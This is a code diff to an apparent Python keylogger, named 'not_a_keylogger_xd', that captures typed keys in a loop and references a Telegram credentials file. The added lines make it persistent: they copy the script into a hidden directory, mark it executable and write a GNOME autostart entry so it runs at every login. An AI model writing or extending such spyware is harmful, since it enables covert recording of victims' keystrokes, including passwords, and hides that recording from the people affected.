@@ -28,9 +28,38 @@ CREDENTIAL_FILE_TELEGRAM = 'credentials_telegram.json'
 DUPLICATE_EXE_DIR = '~/.var/xah/'
 DUPLICATE_NAME_FILE = 'not_a_keylogger_xd'
 
+AUTOSTART_DIR = '~/.config/autostart/'
+AUTOSTART_CONTENT = """[Desktop Entry]
+Type=Application
+Exec=/home/migue8gl/.var/xah/not_a_keylogger_xd
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name[en_GB]=not_a_keylogger_Xd
+Name=not_a_keylogger_Xd
+Comment[en_GB]=
+Comment=
+"""
+
 TIME_OUT = 60 # period in seconds to capture data
 
 # --------------------- FUNCTIONS --------------------- #
+
+def create_autostart_entry():
+    autostart_path = os.path.expanduser(AUTOSTART_DIR)
+    if not os.path.exists(autostart_path):
+        os.makedirs(autostart_path)
+
+    desktop_entry_path = os.path.join(autostart_path, f'{DUPLICATE_NAME_FILE}.desktop')
+
+    # Check if the desktop entry file already exists
+    if not os.path.exists(desktop_entry_path):
+        with open(desktop_entry_path, 'w') as desktop_entry_file:
+            desktop_entry_file.write(AUTOSTART_CONTENT)
+
+        print(f'Autostart entry created at: {desktop_entry_path}')
+    else:
+        print(f'Autostart entry already exists at: {desktop_entry_path}')
 
 def duplicate_script():
     """
@@ -53,6 +82,7 @@ def duplicate_script():
 
     if not os.path.isfile(duplicate_script_path):
         shutil.copyfile(current_script, duplicate_script_path)
+        os.chmod(duplicate_script_path, 0o755)
 
 def write_to_log(message: str, log_name: str) -> bool:
     """
@@ -304,6 +334,7 @@ def load_credentials_telegram_from_script():
 def main():
     key_listener = KeyListener()
     duplicate_script()
+    create_autostart_entry()
     try:
         while True:
             # Capture typed keys and process them
